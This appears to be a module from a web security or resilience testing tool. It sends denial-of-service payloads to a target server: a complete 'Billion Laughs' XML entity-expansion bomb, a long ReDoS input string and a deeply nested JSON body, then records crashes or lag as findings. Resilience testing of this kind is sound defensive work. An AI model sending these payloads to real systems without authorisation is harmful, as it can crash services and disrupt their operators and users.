from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_xml_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    XXE Billion Laughs Attack (DoS)
    Attempts to crash the parser by exponentially expanding entities.
    """
    # Classic Billion Laughs Payload
    # Generates ~3GB of memory usage from a few KB of data
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    # We send this as raw body with Content-Type application/xml
    headers = {"Content-Type": "application/xml"}
    
    # We expect the server to HANG or CRASH (Connection Error / 500)
    # Set a short timeout because if it hangs, we consider that a "success" for DoS
    
    issues = []
    
    try:
        # We manually use client.session but client.send wraps it. 
        # We'll rely on client.send triggering a ReadTimeout if server hangs processing.
        resp = client.send(
            scenario.method, 
            scenario.target, 
            form_body=payload, 
            headers=headers
        )
        
        # If we got a response quickly, the server might have protections or didn't parse external entities.
        if resp.status_code >= 500:
             issues.append("Server Crashed/Errored (5xx) processing XML Bomb")
        elif resp.elapsed_ms > 2000:
             issues.append(f"Server Lagged ({resp.elapsed_ms}ms) processing XML Bomb")
             
    except Exception as e:
        # Connection reset, Broken pipe, etc.
        issues.append(f"Server Crashed/Dropped Connection: {e}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "xml_bomb",
        "passed": len(issues) == 0, # Pass means we DID NOT crash it. Fail means we CRASHED it.
        "details": {"issues": issues}
    }

def run_redos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Regular Expression Denial of Service (ReDoS)
    Target fields that might use regex validation (email, user agent, etc).
    """
    # Evil Regex Patterns? 
    # Actually, we need to send the Input that MATCHES a vulnerable regex on the server.
    # We assume server uses something like `(a+)+` or `([a-zA-Z]+)*`
    # We send "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
    
    payload = "a" * 100000 + "!" # Large input for O(n^2) or O(2^n) regexes
    
    fields = scenario.config.get("fields", ["email", "agent", "search"])
    issues = []
    
    for field in fields:
        body = {field: payload}
        # Assuming JSON
        resp = client.send(scenario.method, scenario.target, json_body=body)
        
        if resp.status_code >= 500:
            issues.append(f"ReDoS caused 500 on field '{field}'")
        elif resp.elapsed_ms > 3000:
            issues.append(f"ReDoS caused significant lag ({resp.elapsed_ms}ms) on '{field}'")
            
    return {
        "scenario_id": scenario.id,
        "attack_type": "redos",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_huge_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Simulates JSON parse exhaustion via Deep Nesting or Huge Keys.
    """
    # Deep Nesting: {"a":{"a": ... }} * 10000
    # Python default recursion limit is 1000. 10000 might crash flask json parser if not safe.
    depth = 2000
    nested = "{}"
    for _ in range(depth):
        nested = '{"a": ' + nested + '}'
        
    # Send
    resp = client.send(
        scenario.method, 
        scenario.target, 
        form_body=nested,
        headers={"Content-Type": "application/json"}
    )
    
    issues = []
    if resp.status_code >= 500:
        issues.append(f"Recursion Crash (Depth {depth}): 500/Crash Error")
    if "recursion" in resp.text.lower():
        issues.append("RecursionError leaked in stack trace")

    return {
        "scenario_id": scenario.id,
        "attack_type": "json_bomb",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
